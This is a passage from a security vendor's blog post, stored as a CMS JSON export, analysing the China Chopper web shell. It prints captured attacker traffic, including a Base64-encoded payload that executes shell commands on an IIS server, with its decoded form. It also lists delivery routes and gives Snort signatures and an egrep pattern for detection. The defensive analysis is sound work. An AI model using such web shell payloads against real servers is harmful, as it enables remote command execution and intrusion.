{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Wed May 04 2016 09:03:57 GMT-0400",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Breaking Down the China Chopper Web Shell - Part II",
    "cq:lastReplicationAction": "Activate",
    "jcr:versionHistory": "9f3c41fb-7b1e-45f1-b8db-8651655ca756",
    "author": "Tony Lee",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "cq:lastReplicatedBy": "lynda.hall@fireeye.com",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "afe90dff-edca-4716-8596-8ef0e5c342d8"
    ],
    "jcr:created": "Fri Jan 26 2018 17:27:12 GMT-0500",
    "cq:lastReplicated": "Fri Jan 26 2018 17:27:11 GMT-0500",
    "cq:lastModified": "Fri Jan 26 2018 17:27:05 GMT-0500",
    "jcr:baseVersion": "afe90dff-edca-4716-8596-8ef0e5c342d8",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-doctypes:blog",
      "fireeye-blog-authors:cap-ian-ahl",
      "fireeye-blog-authors:cap-tony-lee",
      "fireeye-blog-authors:cap-dennis-hanzlik",
      "fireeye-blog-threat-research:threat-research"
    ],
    "jcr:uuid": "af1ee676-b94e-46be-89b7-7eaa2a45a540",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Fri Aug 09 2013 01:00:00 GMT-0700",
    "cq:lastModifiedBy": "lynda.hall@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "text": "\u003Cp\u003E\u003Cem\u003EPart II in a two-part series. Read \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2013\/08\/breaking-down-the-china-chopper-web-shell-part-i.html\u0022\u003EPart I\u003C\/a\u003E.\u003C\/em\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cspan style=\u0022color: #000000;font-weight: bold\u0022\u003EIntroduction\u003C\/span\u003E\u003C\/p\u003E\u003Cp\u003EIn \u003Ca href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2013\/08\/breaking-down-the-china-chopper-web-shell-part-i.html\u0022\u003EPart I\u003C\/a\u003E of this series, I described China Chopper\u0027s easy-to-use interface and advanced features \u2014\u00a0all the more remarkable considering the Web shell\u0027s tiny size:\u00a073 bytes for the aspx version, 4 kilobytes on disk. In this post, I\u0027ll explain China Chopper\u0027s platform versatility, delivery mechanisms, traffic patterns, and detection. My hope is that armed with this information, you can eradicate this pest from your environment.\u003C\/p\u003E\u003Cp\u003E\u003Cstrong\u003EPlatform\u003C\/strong\u003E\u003C\/p\u003E\u003Cp\u003ESo what platform can China Chopper run on? Any Web server that is capable of running JSP, ASP, ASPX, PHP, or CFM. That\u0027s the majority of the Web application languages out there. What about operating systems? China Chopper is flexible enough to run transparently on both Windows and Linux. This OS and application flexibility makes this an even more dangerous Web shell.\u003C!--more--\u003E\u003C\/p\u003E\u003Cp\u003EIn Part I of this series, we showed China Chopper executing on a Windows 2003 IIS server using ASPX. Now we will show it running on Linux with PHP. As shown in Figure 1, the contents of the PHP version are just as minimalistic:\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image001.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2661 landscape-med\u0022 alt=\u0022image001\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image001.jpg\u0022 width=\u0022630\u0022 height=\u0022121\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 1: This command is all that it takes to run on Linux with PHP.\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EWhile the available options differ depending on what platform China Chopper is running on, the file management features in Linux (see Figure 2) are similar to those in Windows.\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image002.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2662 landscape-med\u0022 alt=\u0022image002\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image002.jpg\u0022 width=\u0022782\u0022 height=\u0022325\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 2: File browsing on a target system running Linux\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EThe database client example shown in Figure 3 is MySQL instead of MS-SQL, but it offers many of the same capabilities.\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image003.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2663 landscape-med\u0022 alt=\u0022image003\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image003.jpg\u0022 width=\u0022782\u0022 height=\u0022297\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 3: Database management from a target system running Linux\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EThe virtual terminal looks familiar (Figure 4), but uses Linux commands instead of Windows because these are ultimately interpreted by the underlying operating system.\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image004.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2664 landscape-med\u0022 alt=\u0022image004\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image004.jpg\u0022 width=\u0022782\u0022 height=\u0022296\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 4: Virtual terminal from a target system running Linux\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Cstrong\u003EDelivery Mechanism\u003C\/strong\u003E\u003C\/p\u003E\u003Cp\u003EChina Chopper\u0027s delivery mechanism can be very flexible due to the size, format, and simplicity of the malware\u0027s payload. This small, text-based payload can be delivered using any of the following mechanisms:\u003C\/p\u003E\u003Cul\u003E\u003Cli\u003EWebDAV file upload\u003C\/li\u003E\u003Cli\u003EJBoss jmx-console or Apache Tomcat management pages (For more details on this attack vector, read FireEye consultant Tony Lee\u2019s \u003Ca href=\u0022http:\/\/blog.opensecurityresearch.com\/2012\/09\/manually-exploiting-tomcat-manager.html\u0022\u003Eexplanation\u003C\/a\u003E)\u003C\/li\u003E\u003Cli\u003ERemote exploit with a file drop\u003C\/li\u003E\u003Cli\u003ELateral propagation from other access\u003C\/li\u003E\u003C\/ul\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Ch2\u003ETraffic Analysis\u003C\/h2\u003E\u003C\/p\u003E\u003Cp\u003EWe have now seen the server side payload and the client that is used to control the Web shell. Now let\u0027s examine China Chopper\u0027s traffic. Fortunately, we have both the server and client components, so we can start a packet capture to view the contents of typical traffic. As shown in Figure 5, the client initiates the connection over TCP port 80 using the HTTP \u003Cem\u003EPOST\u003C\/em\u003E method.\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image007.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2671 landscape-med\u0022 alt=\u0022image007\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image007.jpg\u0022 width=\u0022782\u0022 height=\u0022448\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 5: A packet capture shows that the Web shell traffic is HTTP \u003Cem\u003EPOST\u003C\/em\u003E traffic over TCP port 80\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EBecause this is TCP traffic, we can \u201cfollow the TCP\u201d stream in \u003Ca href=\u0022http:\/\/www.wireshark.org\/\u0022\u003EWireshark\u003C\/a\u003E (a popular open-source network-protocol analyzer that works in Unix and Windows).\u00a0In Figure 6, the traffic in red at the top is from the attacker (Web client). The traffic shown in blue at the bottom is the response from the target (Web shell).\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image0081.png\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2672 landscape-med\u0022 alt=\u0022image008\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image0081.png\u0022 width=\u0022754\u0022 height=\u0022667\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 6: After following the TCP stream, we can see that the majority of the attacker traffic is Base64 encoded.\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EAs highlighted above, the majority of the attacker traffic appears to be Base64 encoded. This is not a problem, though, because it can be easily decoded. We use the \u201cTextWizard\u201d feature of the\u00a0free \u003Ca href=\u0022http:\/\/fiddler2.com\/\u0022\u003EFiddler\u003C\/a\u003E Web debugger to discover what the attacker is sending. (Note: \u003Cem\u003E%3D\u003C\/em\u003E is a URL-encoded representation of the equal sign (\u0022=\u0022). Fiddler needs this to be converted to an equals sign for proper decoding.)\u003C\/p\u003E\u003Cp\u003E\u003Cstrong\u003ERaw attacker traffic:\u003C\/strong\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd style=\u0022text-align: left\u0022 valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003EPassword=Response.Write(\u0022-\u0026gt;|\u0022);\u003C\/p\u003E\u003Cp\u003Evar err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).\u003C\/p\u003E\u003Cp\u003EGetString(System. Convert.FromBase64String\u003C\/p\u003E\u003Cp\u003E(\u0022dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5n\u003C\/p\u003E\u003Cp\u003ELkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZX\u003C\/p\u003E\u003Cp\u003EN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0\u003C\/p\u003E\u003Cp\u003EZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2\u003C\/p\u003E\u003Cp\u003EU7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0\u003C\/p\u003E\u003Cp\u003ESW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZX\u003C\/p\u003E\u003Cp\u003ERTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0\u003C\/p\u003E\u003Cp\u003EKCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZS\u003C\/p\u003E\u003Cp\u003EhvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D\u0022)),\u0022unsafe\u0022);}catch(err){Response.Write\u003C\/p\u003E\u003Cp\u003E(\u0022ERROR:\/\/ \u0022%2Berr.message);}Response.Write(\u0022|\u0026lt;-\u0022);Response.End();\u0026amp;z1=Y21k\u0026amp;z2=Y2QgL2QgImM6\u003C\/p\u003E\u003Cp\u003EXGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EAs shown In Figure 9, the Fiddler Web debugger text wizard easily converts the raw traffic from Base64 to plain text.\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image009.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2673 landscape-med\u0022 alt=\u0022image009\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image009.jpg\u0022 width=\u0022782\u0022 height=\u0022579\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 9: Fiddler Web debugger decodes the Base64 traffic\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Cstrong\u003EDecoded traffic:\u003C\/strong\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd style=\u0022text-align: left\u0022 valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Evarc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(65001).\u003C\/p\u003E\u003Cp\u003EGetString(System.Convert.FromBase64String(Request.Item[\u0022\u003Cb\u003Ez1\u003C\/b\u003E\u0022])));\u003C\/p\u003E\u003Cp\u003Evare=newSystem.Diagnostics.Process();\u003C\/p\u003E\u003Cp\u003Evarout:System.IO.StreamReader,EI:System.IO.StreamReader;\u003C\/p\u003E\u003Cp\u003Ec.UseShellExecute=false;\u003C\/p\u003E\u003Cp\u003Ec.RedirectStandardOutput=true;c.RedirectStandardError=true;\u003C\/p\u003E\u003Cp\u003Ee.StartInfo=c;c.Arguments=\u0022\/c\u0022+System.Text.Encoding.GetEncoding(65001).\u003C\/p\u003E\u003Cp\u003EGetString(System.Convert.FromBase64String(Request.Item[\u0022\u003Cb\u003Ez2\u003C\/b\u003E\u0022]));\u003C\/p\u003E\u003Cp\u003Ee.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();\u003C\/p\u003E\u003Cp\u003EResponse.Write(out.ReadToEnd()+EI.ReadToEnd());\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EFinally we have something more readable. However, our Base64-decoded traffic is now attempting to decode more Base64 traffic that is being stored as z1 and z2. Going back to our attacker traffic, right after the end of the \u201cPassword\u201d parameter, we see the z1 and z2 parameters.\u003C\/p\u003E\u003Cp\u003EI\u0027ve highlighted Base64-encoded parameters z1 and z2 in the following output:\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003E\u0026amp;\u003Cspan style=\u0022text-decoration: underline\u0022\u003E\u003Cb\u003Ez1\u003C\/b\u003E\u003C\/span\u003E=Y21k\u0026amp;\u003Cspan style=\u0022text-decoration: underline\u0022\u003E\u003Cb\u003Ez2\u003C\/b\u003E\u003C\/span\u003E=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EBase64-decoded parameters z1 and z2:\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd style=\u0022text-align: left\u0022 valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Ez1=cmdz2=cd \/d \u0022c:\\inetpub\\wwwroot\\\u0022\u0026amp;whoami\u0026amp;echo [S]\u0026amp;cd\u0026amp;echo [E]\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EThat explains how the client communicates with the shell. The \u201cPassword\u201d parameter passes the code to the payload to be executed. The z1 is \u003Cem\u003Ecmd\u003C\/em\u003E, and z2 contains the arguments to the command prompt sent via \u003Cem\u003Ecmd \/c\u003C\/em\u003E. All output is sent to standard output (stdout) back to the attacker, which creates the following response to the \u003Cem\u003Ewhoami\u003C\/em\u003E\u00a0command and the present working directory:\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd style=\u0022text-align: left\u0022 valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003E-\u0026gt;|nt authority\\network service[S]C:\\Inetpub\\wwwroot[E]|\u0026lt;-\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Cstrong\u003EDetection\u003C\/strong\u003E\u003C\/p\u003E\u003Cp\u003ENow that we understand the contents of China Chopper and what its traffic looks like, we can focus on ways to detect this pest both at the network and the host level.\u003C\/p\u003E\u003Cp\u003E\u003Ch3\u003ENetwork\u003C\/h3\u003E\u003C\/p\u003E\u003Cp\u003EWith a standard \u003Ca href=\u0022http:\/\/www.snort.org\/\u0022 target=\u0022_blank\u0022\u003ESnort\u003C\/a\u003E IDS in place, this traffic can be caught with relative ease. Keith Tyler gives a basic IDS signature to work in his early\u00a0\u003Ca href=\u0022http:\/\/informationonsecurity.blogspot.com\/2012\/11\/china-chopper-webshell.html\u0022\u003EChina Chopper blog post\u003C\/a\u003E:\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd style=\u0022text-align: left\u0022 valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Ealert tcp any any -\u0026gt; any 80 ( sid:900001; content:\u0022base64_decode\u0022;\u003C\/p\u003E\u003Cp\u003Ehttp_client_body;flow:to_server,established; content:\u0022POST\u0022; nocase;\u003C\/p\u003E\u003Cp\u003Ehttp_method; ;msg:\u0022Webshell Detected Apache\u0022;)\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003ETo reduce false positives, we have tightened the Snort IDS signature to focus on China Chopper by looking for contents of \u201cFromBase64String\u201d and \u201cz1\u201d as follows:\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd style=\u0022text-align: left\u0022 valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Ealert tcp $EXTERNAL_NET any -\u0026gt; $HTTP_SERVERS $HTTP_PORTS \u003C\/p\u003E\u003Cp\u003E(msg: \u0022China Chopper with first Command Detected\u0022;\u003C\/p\u003E\u003Cp\u003Eflow:to_server,established; content: \u0022FromBase64String\u0022;\u003C\/p\u003E\u003Cp\u003Econtent: \u0022z1\u0022; content:\u0022POST\u0022; nocase;http_method;\u003C\/p\u003E\u003Cp\u003Ereference:url,http:\/\/www.fireeye.com\/blog\/technical\/botnet-activities-research\/2013\/08\/\u003C\/p\u003E\u003Cp\u003Ebreaking-down-the-china-chopper-web-shell-part-i.html;\u003C\/p\u003E\u003Cp\u003Eclasstype:web-application-attack; sid: 900000101;)\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EThe following IDS signature looks for content of \u201cFromBase64String\u201d and any combination of \u201cz\u201d followed by one to three digits \u2014 it\u00a0would find \u0022z1\u201d, \u201cz10\u201d, or \u201cz100\u201d for example. The idea: if the first command (z1) is missed, you still catch subsequent commands.\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre style=\u0022text-align: left\u0022\u003Ealert tcp $EXTERNAL_NET any -\u0026gt; $HTTP_SERVERS $HTTP_PORTS \u003C\/p\u003E\u003Cp\u003E(msg: \u0022China Chopper with all Commands Detected\u0022; flow:to_server,established;\u003C\/p\u003E\u003Cp\u003Econtent: \u0022FromBase64String\u0022; content: \u0022z\u0022; pcre: \u0022\/Z\\d{1,3}\/i\u0022; content:\u0022POST\u0022; nocase;http_method;\u003C\/p\u003E\u003Cp\u003Ereference:url,http:\/\/www.fireeye.com\/blog\/technical\/botnet-activities-research\/2013\/08\/\u003C\/p\u003E\u003Cp\u003Ebreaking-down-the-china-chopper-web-shell-part-i.html;\u003C\/p\u003E\u003Cp\u003Eclasstype:web-application-attack; sid: 900000102;)\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EBoth of these IDS signatures can be modified for further optimization when depth and offset are considered. Be sure to put a valid SID in before implementing and test the signature for performance.\u003C\/p\u003E\u003Cp\u003ENow that we have discussed detection at the network level, we will see that detection at the host level is also possible. Because the shells must contain a predictable syntax, we can quickly attempt to find files that have that code in play.\u003C\/p\u003E\u003Cp\u003E\u003Ch3\u003EHost\u003C\/h3\u003E\u003C\/p\u003E\u003Cp\u003EMany methods can be used to find files that contain China Chopper. The quickest and easiest method, especially on a Linux machine, is probably using regular expressions. As shown in Figure 10, a quick \u003Cem\u003Eegrep\u003C\/em\u003E across your Web directory can help identify infected files.\u003C\/p\u003E\u003Cp\u003E\u003Cdiv class=\u0022blog-table-wrapper\u0022\u003E\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctr\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ctd style=\u0022text-align: left\u0022 valign=\u0022top\u0022 width=\u0022798\u0022\u003E\u003C\/p\u003E\u003Cp\u003E\u003Cpre\u003Eegrep -re \u0027 [\u0026lt;][?]php\\s\\@eval[(]\\$_POST\\[.+\\][)];[?][\u0026gt;]\u0027 *.php\u003Cb\u003E\u003C\/b\u003E\u003C\/pre\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/td\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tr\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/tbody\u003E\u003C\/p\u003E\u003Cp\u003E\u003C\/table\u003E\u003C\/div\u003E\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image010.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2674 landscape-med\u0022 alt=\u0022image010\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image010.jpg\u0022 width=\u0022782\u0022 height=\u0022311\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 10:\u00a0 Using egrep to find this Web shell\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EAs you can see in Figure 10, the\u00a0\u003Cem\u003Eegrep\u003C\/em\u003E and \u003Cem\u003Eregex\u003C\/em\u003E\u00a0commands are a powerful combination. While the regex may seem like gibberish, it really is not as bad as it seems. Ian Ahl has created a few regex tutorials that can help improve your regex skills. Here are two to get you started:\u003C\/p\u003E\u003Cul\u003E\u003Cli\u003E\u003Ca href=\u0022http:\/\/www.tekdefense.com\/news\/2012\/10\/21\/tektip-ep12-regex-basics.html\u0022\u003E\u003Cem\u003Eregex\u003C\/em\u003E basics\u003C\/a\u003E\u003C\/li\u003E\u003Cli\u003E\u003Ca href=\u0022http:\/\/www.tekdefense.com\/news\/2013\/1\/6\/tektip-ep19-using-regex-with-notepad.html\u0022\u003EUsing \u003Cem\u003Eregex\u003C\/em\u003E with Notepad\u003C\/a\u003E\u003C\/li\u003E\u003C\/ul\u003E\u003Cp\u003EWindows also provides a way to search files using regular expressions by using the native \u003Cem\u003Efindstr\u003C\/em\u003E command.\u003C\/p\u003E\u003Cp\u003E\u003Ca href=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image011.jpg\u0022\u003E\u003Cimg class=\u0022alignnone size-full wp-image-2675 landscape-med\u0022 alt=\u0022image011\u0022 src=\u0022\/content\/dam\/legacy\/blog\/2013\/08\/image011.jpg\u0022 width=\u0022696\u0022 height=\u002294\u0022 \/\u003E\u003C\/a\u003E\u003C\/p\u003E\u003Cp\u003EFigure 11: Using \u003Cem\u003Efindstr\u003C\/em\u003E to locate China Chopper\u003C\/p\u003E\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cp\u003EYou may have noticed that we had to change up the \u003Cem\u003Eregex\u003C\/em\u003E a bit. This was necessary to get around some of the ways that 